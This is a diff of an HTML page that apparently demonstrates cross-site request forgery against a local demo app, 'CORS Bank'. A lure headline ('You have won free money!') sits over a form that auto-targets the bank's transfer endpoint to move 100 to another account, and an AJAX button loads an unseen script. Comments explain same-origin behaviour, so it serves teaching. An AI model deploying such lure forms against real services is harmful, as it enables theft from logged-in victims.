@@ -6,14 +6,33 @@
     <title>Phat Lewtz</title>
   </head>
   <body>
-    <form 
-      class="evil-form"
-      action="http://localhost:3000/api/account/transfer"
-      method="post"
-    >
-      <input type="number" name="recipientId" value="2">
-      <input type="number" name="amount" value="100">
-      <button type="submit">Click Here!</button>
-    </form>
+    <header>
+      Congrats CORS Bank customers! You have won free money!
+      Click on one of the buttons below to redeem!
+    </header>
+    <p>
+      If you are getting errors, be sure to log into your
+      CORS Bank account on a separate tab.
+    </p>
+    <section>
+      <header>Form Submission</header>
+      <p>Should work again an unsecured endpoint.</p>
+      <form 
+        class="evil-form"
+        action="http://localhost:3000/api/account/transfer"
+        method="post"
+      >
+        <input type="number" name="recipientId" value="2">
+        <input type="number" name="amount" value="100">
+        <button type="submit">Click Here!</button>
+      </form>
+    </section>
+    <section>
+      <header>AJAX Call</header>
+      <p>Same-Origin policy should prevent the output from being read,
+        but the action of transferring the money still takes place.</p>
+      <button type="button" id="ajax-button">Click Here!</button>
+    </section>
+    <script src="ajax-call.js"></script>
   </body>
 </html>
